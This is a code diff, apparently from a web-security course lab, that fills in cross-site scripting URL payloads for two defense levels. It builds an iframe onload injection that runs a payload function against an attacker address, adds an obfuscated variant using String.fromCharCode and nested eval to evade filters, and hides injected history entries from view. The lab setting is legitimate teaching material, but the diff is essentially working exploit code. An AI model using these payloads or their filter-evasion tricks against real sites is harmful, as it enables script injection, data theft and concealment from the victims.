@@ -55,7 +55,7 @@
 
                     Array.from(document.getElementsByClassName('history-item')).forEach(function (link) {
                         var txt = $(link).text();
-                        if (txt.includes(`456789876543456789876543456789876543`)) {
+                        if (txt.includes(`456789876543456789876543456789876543`) || txt.includes(`iframe`)) {
                             $(link).hide();
                         } 
                     });
@@ -115,9 +115,7 @@
 
             /* Encode your payload function as a string */
             payload_string = payload.toString();
-
-            console.log(payload_string);
-
+            
             switch (defense) {
                 case 1:
                     // TODO: Implement XSS warmup 2.2.3.1
@@ -150,10 +148,19 @@
                 ); 
         case 5:
             // TODO: generate XSS URL payload for defense level 2.2.3.5
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+                encodeURIComponent(
+                    `<iframe type="text/html" src="data:text/html,%3Ch1%3EH%3C%2Fh1%3E" onload="(${payload_string})('${attacker}')">`
+                );
         case 6:
             // TODO: generate XSS URL payload for defense level 2.2.3.6
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            payload_modified = `(${payload_string})(\`${attacker}\`)`;
+            payload_bytes = [...payload_modified].map(x => x.charCodeAt())
+            var byteFuncStr = `String.fromCharCode(...(${JSON.stringify(payload_bytes)}))`
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+            encodeURIComponent(
+                `<iframe type="text/html" src="data:text/html,%3Ch1%3EH%3C%2Fh1%3E" onload="(eval(eval(${byteFuncStr})))">`
+            );
     }
 }
 
